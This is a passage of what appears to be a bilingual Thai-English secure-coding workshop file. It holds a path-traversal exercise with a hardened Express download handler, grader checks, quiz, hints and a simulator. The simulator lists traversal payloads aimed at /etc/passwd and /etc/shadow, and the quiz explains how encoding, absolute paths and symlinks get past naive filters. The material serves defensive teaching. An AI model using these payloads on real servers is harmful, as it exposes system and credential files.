const app = express();

app.get('/files/download', async (req, res) => {
 // basename ตัด path component ทุกตัวทิ้ง เหลือแค่ชื่อไฟล์
  const name = path.basename(String(req.query.file || ''));
 // resolve แปลงเป็น absolute path และยุบ ../ ออกก่อนตรวจขอบเขต
  const target = path.resolve(BASE, name);
 // ต่อ path.sep ด้วย มิฉะนั้น /srv/app/user-files-evil จะผ่านการตรวจ
  if (!target.startsWith(BASE + path.sep)) {
    return res.status(400).json({ error: 'invalid path' });
  }
  try {
    const real = await fs.realpath(target);   // เดินตาม symlink ก่อนอ่านจริง
    if (!real.startsWith(BASE + path.sep)) {
      return res.status(400).json({ error: 'invalid path' });
    }
    const data = await fs.readFile(real);
    res.type('application/octet-stream').send(data);
  } catch (err) {
    res.status(404).json({ error: 'not found' });
  }
});

module.exports = app;`,
        explain: {
          th: 'path.basename() ตัดทุกอย่างที่เป็น directory component ออก../../../../etc/passwd จึงเหลือแค่ passwd ตั้งแต่ต้นทาง จากนั้น path.resolve(BASE, name) แปลงเป็น absolute path พร้อมยุบ../ ที่เหลือ แล้วบรรทัด startsWith(BASE + path.sep) ตรวจ path สุดท้ายที่จะเปิดจริง ๆ ไม่ใช่สตริงที่ผู้ใช้ส่งมา การต่อ path.sep สำคัญมาก เพราะถ้าเทียบกับ BASE เปล่า ๆ โฟลเดอร์ชื่อ /srv/app/user-files-evil จะผ่านการตรวจไปได้ สุดท้าย fs.realpath() เดินตาม symlink แล้วตรวจซ้ำ กันกรณีที่ไฟล์ในโฟลเดอร์เป็น link ชี้ออกไปข้างนอก หมายเหตุ: ถ้าระบบของคุณต้องรองรับ subdirectory จริง ๆ ให้ตัด basename ออกแล้วพึ่ง resolve + startsWith เป็นหลัก',
          en: 'path.basename() strips every directory component, so ../../../../etc/passwd is reduced to passwd right at the entrance. path.resolve(BASE, name) then produces an absolute path with any remaining ../ collapsed, and startsWith(BASE + path.sep) checks the path that will actually be opened rather than the string the user sent. Appending path.sep matters: compared against a bare BASE, a directory named /srv/app/user-files-evil would pass. Finally fs.realpath() follows symlinks and re-checks, covering a file inside the directory that links out of it. Note: if your system genuinely needs subdirectories, drop the basename step and rely on resolve + startsWith.'
        },
        checks: [
          {
            id: 'no-raw-path-join',
            label: { th: 'ไม่ join ค่าจาก request เข้ากับ BASE ตรง ๆ', en: 'Does not join request values straight onto BASE' },
            hint: { th: 'อย่าใช้ path.join(BASE, req.query.file) — ให้ผ่าน basename และ resolve ก่อน', en: 'Do not use path.join(BASE, req.query.file) — go through basename and resolve first' },
            weight: 2,
            mustNotMatch: /path\.join\s*\([^)]*req\.(?:query|params|body)/
          },
          {
            id: 'use-basename',
            label: { th: 'ตัด path component ด้วย path.basename()', en: 'Strips path components with path.basename()' },
            hint: { th: 'เรียก path.basename(String(req.query.file || "")) ก่อนนำไปใช้', en: 'Call path.basename(String(req.query.file || "")) before using the value' },
            weight: 2,
            mustMatch: /path\.basename\s*\(/
          },
          {
            id: 'use-resolve',
            label: { th: 'ใช้ path.resolve() เพื่อได้ absolute path ที่ยุบ../ แล้ว', en: 'Uses path.resolve() to get a normalized absolute path' },
            hint: { th: 'สร้าง path ปลายทางด้วย path.resolve(BASE, name)', en: 'Build the target with path.resolve(BASE, name)' },
            weight: 3,
            mustMatch: /path\.resolve\s*\(/
          },
          {
            id: 'containment-guard',
            label: { th: 'ตรวจว่า path สุดท้ายยังอยู่ใต้ BASE (startsWith)', en: 'Verifies the final path is still under BASE (startsWith)' },
            hint: { th: 'ตรวจด้วย target.startsWith(BASE + path.sep) อย่าลืมตัวคั่น', en: 'Check target.startsWith(BASE + path.sep) — do not forget the separator' },
            weight: 3,
            mustMatch: /\.startsWith\s*\(/
          },
          {
            id: 'reject-on-escape',
            label: { th: 'ตอบ 400/403 เมื่อ path ออกนอกขอบเขต', en: 'Answers 400/403 when the path escapes' },
            hint: { th: 'return res.status(400).json({ error: "invalid path" }) เมื่อการตรวจไม่ผ่าน', en: 'return res.status(400).json({ error: "invalid path" }) when the check fails' },
            weight: 1,
            mustMatch: /status\s*\(\s*40[0-4]\s*\)/
          }
        ],
        traps: [
          {
            id: 'dotdot-denylist',
            match: /\.(?:replace|replaceAll|includes|indexOf|search|startsWith)\s*\(\s*(?:\/[^/\n]*\\?\.\\?\.|['"]\s*\\?\.\\?\.)/,
            message: {
              th: 'การกรองสตริง ".." ไม่ครอบคลุม:..%2f ถูกถอดรหัสหลังตัวกรองของคุณทำงานแล้ว,....// เหลือ../ หลังลบครั้งเดียว, path แบบ absolute เช่น /etc/passwd ไม่มี.. เลย และ symlink ออกนอก base ได้โดยไม่ต้องมี.. ให้ใช้ path.resolve + startsWith(BASE + path.sep) แทน',
              en: 'Filtering the string ".." is not enough: ..%2f is decoded after your filter runs, ....// leaves a working ../ after one pass, an absolute path such as /etc/passwd contains no .. at all, and a symlink escapes the base without one. Use path.resolve plus startsWith(BASE + path.sep) instead.'
            }
          },
          {
            id: 'extension-check-only',
            match: /\.endsWith\s*\(\s*['"]\.[A-Za-z0-9]{2,5}['"]/,
            message: {
              th: 'นามสกุลไฟล์บอกชนิด ไม่ได้บอกตำแหน่ง../../../../srv/other-tenant/invoice.pdf ผ่านการตรวจนามสกุลทุกข้อแต่เป็นไฟล์ของลูกค้ารายอื่น การตรวจ containment ต้องทำแยกเสมอ',
              en: 'An extension tells you the type, not the location. ../../../../srv/other-tenant/invoice.pdf passes every extension check yet belongs to a different customer. Containment must always be checked separately.'
            }
          }
        ]
      }
    },

    hints: [
      {
        th: 'เลิกตรวจสตริงที่ผู้ใช้ส่งมา แล้วหันไปตรวจ path สุดท้ายที่โปรแกรมกำลังจะเปิดจริง ๆ แทน นี่คือความต่างที่สำคัญที่สุดของโจทย์ข้อนี้',
        en: 'Stop validating the string the user sent and start validating the final path you are about to open. That distinction is the whole exercise.'
      },
      {
        th: 'ลำดับต้องเป็น: (1) ประกอบ path จาก BASE (2) normalize/resolve ให้../ ยุบหายไปหมด (3) ค่อยตรวจว่ายังอยู่ใต้ BASE ถ้าสลับ (2) กับ (3) การตรวจจะไร้ความหมาย',
        en: 'The order must be: (1) build the path from BASE, (2) normalize/resolve so every ../ collapses, (3) only then check it is still under BASE. Swap (2) and (3) and the check means nothing.'
      },
      {
        th: 'Java: Paths.get(BASE).resolve(name).normalize() แล้ว startsWith(BASE) — Node: path.resolve(BASE, path.basename(name)) แล้ว startsWith(BASE + path.sep) และเสริมด้วย realpath เมื่อโฟลเดอร์อาจมี symlink',
        en: 'Java: Paths.get(BASE).resolve(name).normalize() then startsWith(BASE). Node: path.resolve(BASE, path.basename(name)) then startsWith(BASE + path.sep), plus realpath when the directory can contain symlinks.'
      }
    ],

    quiz: [
      {
        q: {
          th: 'แอปปฏิเสธทุก request ที่มีสตริง "../" อยู่ใน parameter attacker ยังทำอะไรได้บ้าง',
          en: 'The app rejects every request containing the string "../" in the parameter. What can an attacker still do?'
        },
        choices: [
          { th: 'ทำอะไรไม่ได้แล้ว เพราะถ้าไม่มี../ ก็ออกนอกโฟลเดอร์ไม่ได้', en: 'Nothing — without ../ there is no way out of the directory' },
          { th: 'ยังใช้..%2f..%2f (URL-encoded) และ path แบบ absolute เช่น /etc/passwd ซึ่งไม่มี../ เลย', en: 'Still use ..%2f..%2f (URL-encoded) and absolute paths such as /etc/passwd, which contain no ../ at all' },
          { th: 'ทำได้เฉพาะบน Windows เท่านั้น โดยใช้..\\ แทน', en: 'Only on Windows, by using ..\\ instead' },
          { th: 'ทำอะไรไม่ได้ ถ้าเราเพิ่มการเช็ค "..\\" เข้าไปอีกหนึ่งบรรทัด', en: 'Nothing, once we add one more line checking for "..\\"' }
        ],
        answer: 1,
        why: {
          th: 'ตัวกรองทำงานกับสตริงก่อนที่มันจะถูกถอดรหัสและก่อนที่ระบบไฟล์จะตีความ..%2f จึงผ่านตัวกรองไปแล้วค่อยกลายเป็น../ ตอนถอดรหัส ส่วน /etc/passwd ไม่มี../ เลยแม้แต่ตัวเดียว แต่ทำให้ resolve/join ทิ้ง base directory ทั้งหมด นอกจากนี้ยังมี....// ที่เหลือ../ หลังถูกลบครั้งเดียว และ symlink ที่ออกนอก base ได้โดยไม่มีอักขระต้องสงสัยใด ๆ ปรากฏ',
          en: 'The filter works on the string before it is decoded and before the filesystem interprets it, so ..%2f slips past and only becomes ../ at decoding time. /etc/passwd contains no ../ whatsoever yet makes resolve/join discard the base directory. On top of that, ....// leaves a working ../ after a single removal pass, and a symlink escapes the base with no suspicious characters in the request at all.'
        },
        whyWrong: [
          { th: 'ไม่จริง — path แบบ absolute ไม่ต้องใช้../ เลย และการเข้ารหัสก็ทำให้ตัวกรองมองไม่เห็น', en: 'False — absolute paths need no ../ at all, and encoding hides the sequence from the filter entirely.' },
          null,
          { th: '..\\ เป็นแค่หนึ่งในหลายรูปแบบ บน Linux ก็ยังโดน..%2f,....// และ absolute path ได้เต็ม ๆ', en: '..\\ is only one variant; on Linux ..%2f, ....// and absolute paths all still work.' },
          { th: 'การเพิ่มรูปแบบลงใน denylist ทีละแบบคือเกมที่คุณต้องถูกทุกครั้ง แต่ attacker ขอถูกครั้งเดียว — แม้แต่ Apache ยังแก้ CVE-2021-41773 ไม่ครบในรอบแรก', en: 'Adding one more pattern to a denylist is a game where you must be right every time and the attacker only once — even Apache failed to fully fix CVE-2021-41773 on the first attempt.' }
        ]
      },
      {
        q: {
          th: 'ข้อใดคือการตรวจ containment ที่ถูกต้อง (BASE เป็น absolute path ที่ normalize แล้ว)',
          en: 'Which is the correct containment check (BASE is an absolute, normalized path)?'
        },
        choices: [
          { th: 'ตรวจว่า name ไม่มีสตริง ".." ก่อนแล้วค่อย join กับ BASE', en: 'Check that name contains no ".." and then join it onto BASE' },
          { th: 'resolve name เข้ากับ BASE, normalize ให้../ ยุบหมด แล้วจึงตรวจว่า path ผลลัพธ์ยังอยู่ใต้ BASE', en: 'Resolve name against BASE, normalize so every ../ collapses, then check that the result is still under BASE' },
          { th: 'ตรวจ startsWith(BASE) กับ path ดิบก่อน แล้วค่อย normalize ตอนจะเปิดไฟล์', en: 'Check startsWith(BASE) on the raw path first, then normalize when opening the file' },
          { th: 'ตรวจว่านามสกุลไฟล์อยู่ใน allowlist (.pdf,.png) ก็เพียงพอ', en: 'Checking the extension against an allowlist (.pdf, .png) is sufficient' }
        ],
        answer: 1,
        why: {
          th: 'การตรวจต้องเกิดขึ้นกับ path ที่ผ่านการ normalize แล้วเท่านั้น เพราะนั่นคือ path เดียวกับที่ระบบไฟล์จะเปิดจริง ขั้นตอน resolve ทำให้ absolute path ถูกจับได้ (มันจะทิ้ง BASE แล้วตกที่การตรวจ) ส่วน normalize ทำให้../ ทุกตัวหายไปก่อนตรวจ อย่าลืมเทียบกับ BASE พร้อมตัวคั่น เพื่อไม่ให้ /srv/app/user-files-evil ผ่านไปได้',
          en: 'The check must happen on the normalized path, because that is the same path the filesystem will open. Resolving catches absolute paths (they discard BASE and then fail the check), and normalizing removes every ../ before the check runs. Remember to compare against BASE plus the separator so /srv/app/user-files-evil cannot slip through.'
        },
        whyWrong: [
          { th: 'เป็นการตรวจสตริง ซึ่งหลบได้ด้วย..%2f,....//, path แบบ absolute และ symlink — และไม่ได้บอกอะไรเลยว่าไฟล์ปลายทางอยู่ที่ไหน', en: 'That is a string check, bypassed by ..%2f, ....//, absolute paths and symlinks — and it tells you nothing about where the file actually lands.' },
          null,
          { th: 'ลำดับผิด: ก่อน normalize สตริง /srv/app/user-files/../../etc/passwd ผ่าน startsWith(BASE) ได้สบาย ทั้งที่ชี้ไปที่ /etc/passwd', en: 'Wrong order: before normalizing, /srv/app/user-files/../../etc/passwd passes startsWith(BASE) comfortably while pointing at /etc/passwd.' },
          { th: 'นามสกุลบอกชนิดไฟล์ ไม่ได้บอกตำแหน่ง../../other-tenant/invoice.pdf ผ่าน allowlist นามสกุลได้ทุกข้อ', en: 'An extension describes the type, not the location — ../../other-tenant/invoice.pdf passes any extension allowlist.' }
        ]
      }
    ],

    sim: {
      kind: 'path',
      config: {
        baseDir: '/srv/app/user-files'
      },
      payloads: [
        { label: { th: 'ใส่ ../ ถอยออกจากโฟลเดอร์ที่กำหนด ไปอ่าน /etc/passwd', en: 'Classic traversal — climb up to /etc/passwd' }, value: '../../../../etc/passwd' },
        { label: { th: 'URL-encoded — ผ่านตัวกรองที่มองหาสตริง../ ตรง ๆ', en: 'URL-encoded — slips past a filter looking for a literal ../' }, value: '..%2f..%2f..%2f..%2fetc%2fshadow' },
        { label: { th: 'Absolute path — ไม่มี../ เลย แต่ทิ้ง base directory ทั้งหมด', en: 'Absolute path — no ../ at all, yet it discards the base directory' }, value: '/etc/passwd' }
      ],
      allowCustom: true
    },

    references: [
      { label: 'OWASP Input Validation Cheat Sheet (File and path handling)', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html' },
      { label: 'OWASP — Path Traversal', url: 'https://owasp.org/www-community/attacks/Path_Traversal' },
      { label: 'CWE-22: Improper Limitation of a Pathname to a Restricted Directory', url: 'https://cwe.mitre.org/data/definitions/22.html' }
    ]
  };

 /* ======================================================================
 * Workshop object
 * ==================================================================== */
  const WORKSHOP = {
    id: 'w1',
    order: 1,
    title: {
      th: 'Workshop 1: Injection & การตรวจสอบ Input',
      en: 'Workshop 1: Injection & Input Validation'
    },
    summary: {
      th: 'ช่องโหว่ทั้งสี่หัวข้อนี้มีจุดเริ่มเหมือนกัน คือโค้ดนำ input จากผู้ใช้ไปปนกับสิ่งที่ระบบจะตีความเป็นคำสั่ง จนข้อมูลสามารถเปลี่ยนพฤติกรรมของคำสั่งได้',
      en: 'Four injection-family vulnerabilities that all share one root cause: user input mixed into a command that some interpreter has to parse.'
    },
    goal: {
      th: 'จบ workshop นี้ คุณจะแยกได้ว่าจุดไหนในโค้ดกำลังนำ "ข้อมูล" ไปปนกับ "คำสั่ง" และเลือกวิธีป้องกันให้ตรงกับ context เช่น parameterized query, output encoding, argv array และการตรวจ path หลัง normalize',
      en: 'By the end of this workshop you will be able to spot exactly where data and command get mixed in your own code and fix it with the right mechanism for each context — parameterized queries, context-aware output encoding, argv arrays instead of a shell, and post-normalization path checks — and explain why character filtering is never enough.'
    },
    exercises: [SQL_INJECTION, XSS, COMMAND_INJECTION, PATH_TRAVERSAL]
  };

  global.SCW = global.SCW || { workshops: [], registerWorkshop: function (w) { this.workshops.push(w); } };
  global.SCW.registerWorkshop(WORKSHOP);
  if (typeof module !== 'undefined' && module.exports) module.exports = WORKSHOP;
})(typeof window !== 'undefined' ? window : globalThis);
